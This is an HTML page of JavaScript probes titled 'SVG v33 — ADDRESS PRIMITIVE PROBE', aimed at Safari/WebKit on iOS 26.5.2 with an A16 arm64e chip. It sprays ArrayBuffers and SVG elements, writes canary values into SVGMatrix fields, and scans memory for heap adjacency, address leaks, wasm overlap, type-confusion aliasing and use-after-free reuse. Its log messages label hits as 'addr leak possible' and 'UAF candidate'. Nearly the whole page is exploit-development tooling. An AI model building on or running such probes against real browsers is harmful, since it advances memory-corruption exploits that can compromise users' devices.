<body>
<h1>▓ SVG v33 — ADDRESS PRIMITIVE PROBE</h1>
<h2>heap adjacency · GC oracle · wasm overlap · arraybuffer spray · iOS 26.5.2 / A16 arm64e</h2>

<div class="suite">
<button id="btn-all" onclick="runAll()">★ RUN ALL</button>

<script>
var NS='http://www.w3.org/2000/svg';
var INT32_OVF=2147483648;
var CANARY=0x4141414142424242;  // AAAABBBB as float pattern

var _fb=new ArrayBuffer(8);
var _dv=new Float64Array(_fb);
var _uv=new Uint32Array(_fb);
function f64hi(f){_dv[0]=f;return _uv[1];}
function f64lo(f){_dv[0]=f;return _uv[0];}
function f64hex(f){_dv[0]=f;return'0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0');}
function fromHiLo(hi,lo){_uv[1]=hi>>>0;_uv[0]=lo>>>0;return _dv[0];}
function isArmPtr(v){
  if(v===null||v===undefined||isNaN(v)||!isFinite(v))return false;
  _dv[0]=v;
  var hi=_uv[1];
  if(hi>=0x00000001&&hi<=0x0001ffff)return true;
  return false;
}

function log(m,c){
  var d=document.getElementById('out');
  var e=document.createElement('div');
  e.className='result '+(c||'info');
  e.textContent=m;
  d.appendChild(e);
  e.scrollIntoView({block:'nearest'});
}
function prog(m){document.getElementById('progress').textContent=m;}
function hdr(m){log(m,'hdr');}
function clearOut(){document.getElementById('out').innerHTML='';prog('');}
function copyAll(){
  var lines=[];
  document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
  navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
}
function go(s){clearOut();window['run'+s]();}
function runAll(){
  clearOut();
  runGC();
  setTimeout(function(){runAB();},1500);
  setTimeout(function(){runWM();},3500);
  setTimeout(function(){runTY();},5500);
  setTimeout(function(){runSZ();},7000);
  setTimeout(function(){runNB();},8500);
}

function mkSVG(w,h,vb){
  var s=document.createElementNS(NS,'svg');
  s.setAttribute('width',w||100);s.setAttribute('height',h||100);
  if(vb)s.setAttribute('viewBox',vb);
  s.style.cssText='position:fixed;left:0;top:0;width:'+(w||100)+'px;height:'+(h||100)+'px;opacity:0.001;pointer-events:none';
  document.body.appendChild(s);
  return s;
}
function mkRect(p,x,y,w,h){
  var r=document.createElementNS(NS,'rect');
  r.setAttribute('x',x||0);r.setAttribute('y',y||0);
  r.setAttribute('width',w||10);r.setAttribute('height',h||10);
  p.appendChild(r);return r;
}
function getMX(el){
  el.setAttribute('transform','matrix(1 0 0 1 0 0)');
  return el.transform.baseVal.getItem(0).matrix;
}
function ctm(el){try{return el.getScreenCTM();}catch(e){return null;}}
function writeMX(mx,v){mx.e=v;return ctm;}

// ════════════════════════════════════════════════════════════════════════
// GC — GC timing oracle
// write canary to SVGMatrix, trigger GC, re-read via CTM
// if value moves/changes: SVGMatrix is on JSC heap (moveable)
// if value stays exact: SVGMatrix is on native heap (fixed address)
// CRITICAL: tells us which heap to target
// ════════════════════════════════════════════════════════════════════════
function runGC(){
  hdr('GC: GC oracle — is SVGMatrix on JSC heap or native heap?');
  var svg=mkSVG(100,100);
  var r=mkRect(svg,0,0,10,10);
  var mx=getMX(r);

  // write distinctive canary value
  var canary=fromHiLo(0x41424344,0x45464748);  // ABCDEFGH
  mx.e=canary;
  var c0=ctm(r);
  var before=c0?c0.e:null;

  // trigger GC: allocate and discard lots of objects
  function triggerGC(){
    var junk=[];
    for(var i=0;i<50000;i++){
      junk.push({a:new Array(100).fill(i),b:new Float64Array(16)});
    }
    junk=null;
    // also create/destroy SVG elements to pressure SVG allocator
    for(var j=0;j<1000;j++){
      var tmp=mkSVG(10,10);
      mkRect(tmp,0,0,5,5);
      tmp.remove();
    }
  }

  triggerGC();

  // read back
  var c1=ctm(r);
  var after=c1?c1.e:null;
  var survived=(after===before);

  log('GC[1]: canary='+f64hex(canary)+' before='+before+' after='+after+' survived='+survived,
    survived?'star — CANARY SURVIVED GC: native heap (fixed addr) or GC-pinned':
    'uaf — CANARY CHANGED AFTER GC: JSC heap (object moved!)');
  log('GC[1]: implication: '+(survived?
    'SVGMatrix likely on WebCore native heap — fixed address, predictable layout':
    'SVGMatrix on JSC heap — may be accessible via JSC primitives'),
    survived?'star':'leak');

  // GC[2]: does the SVGMatrix wrapper JS object survive GC when only the rect holds it?
  hdr('GC[2]: wrapper survival — does matrix JS object get GC\'d if rect loses ref?');
  var svg2=mkSVG(100,100);
  var r2=mkRect(svg2,0,0,10,10);
  var mx2=getMX(r2);
  mx2.e=fromHiLo(0xdeadbeef,0xcafebabe);
  // detach rect from SVG (should allow GC of the rect's JS wrapper)
  r2.remove();
  triggerGC();
  // try to read back via the now-detached rect
  var c2=null;
  try{c2=r2.getScreenCTM();}catch(e){c2=null;}
  log('GC[2]: read after rect.remove()+GC: '+(c2?'got CTM.e='+c2.e:'null/exception'),
    c2===null?'info — CTM null after detach (expected)':
    c2.e===fromHiLo(0xdeadbeef,0xcafebabe)?'uaf — VALUE SURVIVED DETACH: dangling ref!':'warn — different value');

  svg.remove();svg2.remove();
  prog('GC done');
}

// ════════════════════════════════════════════════════════════════════════
// AB — ArrayBuffer adjacency spray
// spray ArrayBuffers of known sizes around SVGMatrix allocations
// write canary to SVGMatrix.e, scan ArrayBuffers for the canary
// if found: we know the offset between AB and SVGMatrix → address leak
// ════════════════════════════════════════════════════════════════════════
function runAB(){
  hdr('AB: ArrayBuffer adjacency spray');
  var SPRAY_N=512;
  var AB_SIZE=256;  // bytes, must cover a potential SVGMatrix struct

  // canary as float64 — distinctive bit pattern
  var canaryVal=fromHiLo(0x13371337,0xdeadbeef);
  log('AB[1]: canary value='+f64hex(canaryVal),'info');

  // interleave: AB, SVG, AB, SVG... to maximize adjacency chance
  var abs=[];
  var svgs=[];
  var mxs=[];

  for(var i=0;i<SPRAY_N;i++){
    abs.push(new ArrayBuffer(AB_SIZE));
    var s=mkSVG(50,50);
    var rr=mkRect(s,0,0,5,5);
    getMX(rr);
    mxs.push(rr.transform.baseVal.getItem(0).matrix);
    svgs.push(s);
  }

  // write canary to ALL matrices
  mxs.forEach(function(m){m.e=canaryVal;});

  // scan every ArrayBuffer for the canary hi/lo words
  var canaryHi=0x13371337;
  var canaryLo=0xdeadbeef;
  var hits=[];

  abs.forEach(function(ab,abIdx){
    var view=new Uint32Array(ab);
    for(var off=0;off<view.length-1;off+=1){
      if(view[off]===canaryLo&&view[off+1]===canaryHi){
        hits.push({abIdx:abIdx,byteOffset:off*4,view:view});
      }
      if(view[off]===canaryHi&&view[off+1]===canaryLo){
        hits.push({abIdx:abIdx,byteOffset:off*4,view:view,swapped:true});
      }
    }
  });

  log('AB[1]: sprayed '+SPRAY_N+' AB+SVG pairs, scanned '+SPRAY_N+' ArrayBuffers ('+AB_SIZE+'B each)',
    hits.length>0?'aslr — CANARY FOUND IN ARRAYBUFFER! hits='+hits.length:
    'info — canary not found in ABs (expected on separate allocators)');

  if(hits.length>0){
    hits.slice(0,3).forEach(function(h){
      log('AB[1]: HIT: ab['+h.abIdx+'] offset='+h.byteOffset+(h.swapped?' (swapped)':''),
        'aslr — SVGMatrix ADJACENT TO ARRAYBUFFER: addr leak possible!');
      // dump surrounding bytes
      var dumpStart=Math.max(0,(h.byteOffset/4)-4);
      var dumpEnd=Math.min(h.view.length,dumpStart+16);
      var dump=[];
      for(var k=dumpStart;k<dumpEnd;k++)dump.push(h.view[k].toString(16).padStart(8,'0'));
      log('AB[1]:   dump['+dumpStart*4+']: '+dump.join(' '),'leak');
    });
  }

  // AB[2]: try Float64Array view to catch full f64 canary
  hdr('AB[2]: Float64Array scan for exact canary');
  var f64hits=[];
  abs.forEach(function(ab,abIdx){
    var fview=new Float64Array(ab);
    for(var off=0;off<fview.length;off++){
      if(fview[off]===canaryVal){
        f64hits.push({abIdx:abIdx,f64off:off});
      }
    }
  });
  log('AB[2]: Float64Array scan: hits='+f64hits.length,
    f64hits.length>0?'aslr — EXACT F64 CANARY IN ARRAYBUFFER!':
    'info — no f64 hits (SVGMatrix not sharing AB backing store)');

  svgs.forEach(function(s){s.remove();});
  prog('AB done');
}

// ════════════════════════════════════════════════════════════════════════
// WM — WebAssembly memory overlap probe
// allocate wasm linear memory, then create SVGMatrix
// check if wasm memory contains canary written to SVGMatrix
// WASM linear memory is a large contiguous ArrayBuffer — better coverage
// ════════════════════════════════════════════════════════════════════════
function runWM(){
  hdr('WM: WebAssembly memory overlap probe');

  // check wasm support
  if(typeof WebAssembly==='undefined'){
    log('WM[1]: WebAssembly not available','warn');
    prog('WM done');
    return;
  }

  // minimal wasm module that exports its memory
  // (mem 1 32) = 1 initial page (64KB), 32 max pages (2MB)
  var wasmBytes=new Uint8Array([
    0x00,0x61,0x73,0x6d, // magic
    0x01,0x00,0x00,0x00, // version
    0x05,0x04,0x01,0x01,0x00,0x20, // memory section: 1 mem, min=1, max=32
    0x07,0x07,0x01,0x03,0x6d,0x65,0x6d,0x02,0x00  // export "mem" memory 0
  ]);

  WebAssembly.instantiate(wasmBytes).then(function(result){
    var mem=result.instance.exports.mem;
    if(!mem){log('WM[1]: no exported memory','warn');return;}

    var wasmBuf=mem.buffer;
    var wasmU32=new Uint32Array(wasmBuf);
    var wasmF64=new Float64Array(wasmBuf);
    var wasmSize=wasmBuf.byteLength;

    log('WM[1]: wasm memory size='+wasmSize+' bytes ('+( wasmSize/1024)+'KB)','info');

    // write canary to wasm memory at known offsets
    var wmCanaryHi=0x57415353;  // "WASS"
    var wmCanaryLo=0x4d454d4f;  // "MEMO"
    var wmCanary=fromHiLo(wmCanaryHi,wmCanaryLo);

    // fill wasm memory with canary pattern
    for(var wi=0;wi<Math.min(wasmU32.length,16384);wi+=2){
      wasmU32[wi]=wmCanaryLo;
      wasmU32[wi+1]=wmCanaryHi;
    }

    // now create SVGMatrix and write a different canary
    var svg=mkSVG(100,100);
    var r=mkRect(svg,0,0,10,10);
    getMX(r);
    var mx=r.transform.baseVal.getItem(0).matrix;
    var svgCanary=fromHiLo(0x53564753,0x56475653);
    var svgCanary2=svgCanary;
    mx.e=svgCanary2;
    mx.f=svgCanary2;

    // scan wasm memory for svgCanary2
    var svgHi2=0x53564753;
    var svgLo2=0x56475653;
    var wmhits=[];
    for(var wj=0;wj<Math.min(wasmU32.length-1,16384);wj++){
      if(wasmU32[wj]===svgLo2&&wasmU32[wj+1]===svgHi2){
        wmhits.push(wj*4);
      }
    }

    log('WM[2]: SVGMatrix canary in wasm memory: hits='+wmhits.length,
      wmhits.length>0?'aslr — SVG CANARY IN WASM MEMORY: OVERLAP! offset='+wmhits[0]:
      'info — no overlap (SVGMatrix not in wasm linear memory, expected)');

    // WM[3]: reverse — write pattern to wasm mem, read SVGMatrix
    // if SVGMatrix is IN wasm memory, we can corrupt it via wasm writes
    hdr('WM[3]: wasm→SVGMatrix write test');
    // find where mx.e is currently stored by probing
    var knownVal=fromHiLo(0xAAAAAAAA,0xBBBBBBBB);
    mx.e=knownVal;
    var knownHi=0xAAAAAAAA;
    var knownLo=0xBBBBBBBB;
    var found=-1;
    for(var wk=0;wk<Math.min(wasmU32.length-1,16384);wk++){
      if(wasmU32[wk]===knownLo&&wasmU32[wk+1]===knownHi){found=wk*4;break;}
    }
    log('WM[3]: SVGMatrix.e in wasm mem at offset: '+(found>=0?found:'NOT FOUND'),
      found>=0?'aslr — SVGMatrix IS IN WASM LINEAR MEMORY! offset='+found:
      'info — SVGMatrix not in wasm linear memory (separate native heap)');

    svg.remove();
    prog('WM done');
  }).catch(function(e){
    log('WM[1]: wasm instantiate failed: '+e,'warn');
    prog('WM done');
  });
}

// ════════════════════════════════════════════════════════════════════════
// TY — type confusion probe
// SVGMatrix implements DOMMatrix interface
// test if we can get a DataView / TypedArray alias onto the same backing memory
// via DOMMatrix → Float64Array path (non-standard but sometimes exposed)
// ════════════════════════════════════════════════════════════════════════
function runTY(){
  hdr('TY: type confusion / DOMMatrix alias probe');

  // TY[1]: DOMMatrix from SVGMatrix — do they share backing storage?
  hdr('TY[1]: SVGMatrix → DOMMatrix — shared backing?');
  var svg=mkSVG(100,100);
  var r=mkRect(svg,0,0,10,10);
  var svgMX=getMX(r);
  var canary=fromHiLo(0xC0FEC0FE,0xBEEFBEEF);
  svgMX.e=canary;

  // try to get DOMMatrix from the element
  var dm=null;
  try{dm=new DOMMatrix(r.getAttribute('transform'));}catch(e){}

  if(dm){
    log('TY[1]: DOMMatrix created from transform attr: e='+dm.e+' (expected '+canary+')',
      dm.e===canary?'leak — DOMMatrix.e === SVGMatrix canary: same backing!':
      'info — DOMMatrix.e='+dm.e+' (independent copy)');
  } else {
    log('TY[1]: DOMMatrix not available or failed','info');
  }

  // TY[2]: SVGMatrix via consolidate — does consolidate create new object or alias?
  hdr('TY[2]: SVGTransformList.consolidate() alias probe');
  var canary2=fromHiLo(0xFEEDFACE,0xCAFEBABE);
  svgMX.e=canary2;
  var consolidated=null;
  try{
    r.transform.baseVal.consolidate();
    consolidated=r.transform.baseVal.getItem(0).matrix;
  }catch(e){}

  if(consolidated){
    var sameObj=(consolidated===svgMX);
    log('TY[2]: consolidated matrix: e='+consolidated.e+
      ' same_obj='+(consolidated===svgMX),
      consolidated.e===canary2?
        (sameObj?'leak — SAME OBJECT: consolidate returns existing matrix!':
         'info — same value but different JS object'):
      'warn — different value after consolidate: '+consolidated.e);
  }

  // TY[3]: multiple getItem(0) calls — same backing object?
  hdr('TY[3]: multiple getItem(0) — shared backing?');
  var mx1=r.transform.baseVal.getItem(0).matrix;
  var mx2=r.transform.baseVal.getItem(0).matrix;
  var testVal=fromHiLo(0x11111111,0x22222222);
  mx1.e=testVal;
  var sameRef=(mx2.e===testVal);
  log('TY[3]: write to mx1.e, read mx2.e: got='+mx2.e+' match='+sameRef,
    sameRef?'leak — SHARED BACKING: mx1 and mx2 alias same memory!':
    'info — independent: mx1 and mx2 are separate objects');

  // TY[4]: SVGTransform.matrix vs element.getCTM() — shared?
  hdr('TY[4]: SVGTransform.matrix vs getCTM — same object?');
  var txMatrix=r.transform.baseVal.getItem(0).matrix;
  var testVal2=fromHiLo(0x33333333,0x44444444);
  txMatrix.e=testVal2;
  var localCTM=null;
  try{localCTM=r.getCTM();}catch(e){}
  if(localCTM){
    log('TY[4]: txMatrix.e='+testVal2+' getCTM().e='+localCTM.e,
      localCTM.e===testVal2?'leak — getCTM shares backing with txMatrix!':
      'info — getCTM returns copy: '+localCTM.e);
  }

  svg.remove();
  prog('TY done');
}

// ════════════════════════════════════════════════════════════════════════
// SZ — SVGMatrix struct size probe
// write known patterns to mx.a, b, c, d, e, f
// read back all 6 to establish the struct field layout
// then probe adjacent writes: does writing past f corrupt the next object?
// ════════════════════════════════════════════════════════════════════════
function runSZ(){
  hdr('SZ: SVGMatrix struct layout probe');

  var svg=mkSVG(100,100);
  var r=mkRect(svg,0,0,10,10);
  var mx=getMX(r);

  // SZ[1]: write distinct canaries to all 6 fields, read back
  hdr('SZ[1]: all 6 fields canary write/read');
  var fields={
    a:fromHiLo(0x0000000A,0x0000000A),
    b:fromHiLo(0x0000000B,0x0000000B),
    c:fromHiLo(0x0000000C,0x0000000C),
    d:fromHiLo(0x0000000D,0x0000000D),
    e:fromHiLo(0x0000000E,0x0000000E),
    f:fromHiLo(0x0000000F,0x0000000F)
  };
  Object.keys(fields).forEach(function(k){mx[k]=fields[k];});

  var c=ctm(r);
  log('SZ[1]: CTM after writing all fields:',
    'info');
  ['a','b','c','d','e','f'].forEach(function(k){
    var got=c?c[k]:null;
    var expected=fields[k];
    log('SZ[1]:   field.'+k+': wrote='+f64hex(expected)+' CTM.'+k+'='+( got===null?'null':f64hex(got))+
      ' match='+(got===expected),
      got===expected?'pass — field '+k+' round-trips exact':'warn — field '+k+' mismatch');
  });

  // SZ[2]: struct size from allocation pattern
  // create two SVGMatrix objects back to back, check address gap via timing
  hdr('SZ[2]: create matrix chain — timing-based size estimate');
  var t0=performance.now();
  var chain=[];
  for(var i=0;i<10000;i++){
    var tmp=document.createElementNS(NS,'rect');
    tmp.setAttribute('transform','matrix(1 0 0 1 0 0)');
    chain.push(tmp.transform.baseVal.getItem(0).matrix);
  }
  var t1=performance.now();
  log('SZ[2]: created 10000 SVGMatrix objects in '+(t1-t0).toFixed(1)+'ms ('+((t1-t0)/10000).toFixed(4)+'ms each)','info');
  log('SZ[2]: SVGMatrix struct likely 48 or 64 bytes (6 × f64 = 48B + padding)','star');

  // SZ[3]: does writing e/f with INT32_OVF corrupt adjacent field?
  hdr('SZ[3]: overflow write adjacency — does OVF to mx.e corrupt mx.f?');
  var svg3=mkSVG(100,100);
  var r3=mkRect(svg3,0,0,10,10);
  var mx3=getMX(r3);
  var fCanary=fromHiLo(0xF0F0F0F0,0xF0F0F0F0);
  mx3.f=fCanary;
  mx3.e=INT32_OVF;  // write OVF to e — does it bleed into f?
  var c3=ctm(r3);
  log('SZ[3]: wrote OVF to mx.e, f canary was='+f64hex(fCanary)+
    ' f now='+( c3?f64hex(c3.f):'null'),
    c3&&c3.f===fCanary?'pass — f unchanged (no bleed)':
    c3?'uaf — F VALUE CHANGED AFTER OVF WRITE TO E! was='+f64hex(fCanary)+' now='+f64hex(c3.f):
    'warn');
  svg3.remove();

  svg.remove();
  prog('SZ done');
}

// ════════════════════════════════════════════════════════════════════════
// NB — neighbor probe
// create two rects in same SVG back to back
// write canary to rect[0]'s matrix, check if it appears in rect[1]'s CTM
// if SVGMatrix objects are contiguous in memory, an overflow from [0] touches [1]
// ════════════════════════════════════════════════════════════════════════
function runNB(){
  hdr('NB: neighbor probe — adjacent SVGMatrix objects');

  var N=4;  // create N rects, test adjacency between consecutive pairs
  var svg=mkSVG(100,100);
  var rects=[],mxs=[];
  for(var i=0;i<N;i++){
    var rr=mkRect(svg,i,0,5,5);
    getMX(rr);
    mxs.push(rr.transform.baseVal.getItem(0).matrix);
    rects.push(rr);
  }

  // NB[1]: write canary to mx[0].e, check if mx[1] changed
  hdr('NB[1]: write to mx[0] — does mx[1] see it?');
  var nb1Canary=fromHiLo(0xAB1AB1AB,0x1AB1AB1A);
  var nb1Canary2=nb1Canary;
  mxs[0].e=nb1Canary2;
  var after1=ctm(rects[1]);
  log('NB[1]: wrote canary to mx[0].e, mx[1].e='+( after1?f64hex(after1.e):'null'),
    after1&&after1.e===nb1Canary2?'uaf — MX[1] SAW MX[0] WRITE: ADJACENT MEMORY!':
    'info — mx[1] independent (expected)');

  // NB[2]: spray N rects, check if any share backing
  hdr('NB[2]: N='+N+' rects — write unique canary to each, verify isolation');
  var canaries=mxs.map(function(_,i){return fromHiLo(0xCA000000+i,0x00000000+i);});
  mxs.forEach(function(m,i){m.e=canaries[i];});
  // re-read all CTMs
  var allOK=true;
  mxs.forEach(function(m,i){
    var c=ctm(rects[i]);
    var got=c?c.e:null;
    var ok=(got===canaries[i]);
    if(!ok)allOK=false;
    log('NB[2]: rect['+i+']: wrote='+f64hex(canaries[i])+' read='+( got===null?'null':f64hex(got))+' ok='+ok,
      ok?'pass':'uaf — WRONG VALUE: possible aliasing!');
  });
  log('NB[2]: isolation result: '+(allOK?'all isolated':'ALIASING DETECTED!'),
    allOK?'pass — matrices are isolated':'uaf — MATRIX ALIASING!');

  // NB[3]: create rect, delete it, create new rect — does new rect get old memory?
  hdr('NB[3]: free/realloc — does new rect get freed matrix memory?');
  var svg3=mkSVG(100,100);
  var r3a=mkRect(svg3,0,0,5,5);
  getMX(r3a);
  var mx3a=r3a.transform.baseVal.getItem(0).matrix;
  var freeCanary=fromHiLo(0xFEEBDAED,0xFEEBDAED);
  mx3a.e=freeCanary;
  // detach and hope memory is reused
  r3a.remove();
  // force GC
  var junk=[];
  for(var gi=0;gi<10000;gi++)junk.push(new Float64Array(16));
  junk=null;
  // allocate new rect
  var r3b=mkRect(svg3,0,0,5,5);
  getMX(r3b);
  var c3b=ctm(r3b);
  var got3b=c3b?c3b.e:null;
  log('NB[3]: free canary='+f64hex(freeCanary)+' new rect CTM.e='+( got3b===null?'null':f64hex(got3b)),
    got3b===freeCanary?'uaf — NEW RECT GOT FREED MATRIX MEMORY! UAF candidate!':
    'info — new rect has fresh matrix (no reuse detected, value='+got3b+')');

  svg.remove();svg3.remove();
  prog('NB done — v33 complete');
}
</script>
